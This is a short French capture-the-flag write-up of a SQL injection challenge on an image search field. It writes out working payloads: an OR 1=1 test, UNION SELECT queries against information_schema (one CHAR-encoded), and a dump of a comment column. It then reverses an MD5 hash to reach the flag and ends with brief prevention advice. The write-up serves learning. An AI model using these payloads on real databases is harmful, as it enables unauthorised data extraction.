Recherche une image par number

On teste 1 OR 1=1 → 
ça affiche toutes les images 

On utilise 1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = database() --
On découvre la table : list_images

On utilise 1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = CHAR(108,105,115,116,95,105,109,97,103,101,115) --
→ On découvre les colonnes : id, url, title, comment

On utilise 1 UNION SELECT comment, 2 FROM list_images --


ID: 1 UNION SELECT comment, title FROM list_images -- 
Title: 2
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46


Le hash MD5 est : 1928e8083cf461a51303633093573c46
→ Reverse MD5 : albatroz
→ SHA256 de "albatroz"

Comment l'éviter? 
- Valider les entrées utilisateurs dans le back.
- Les ORM actuels sont protégé contre cela. 


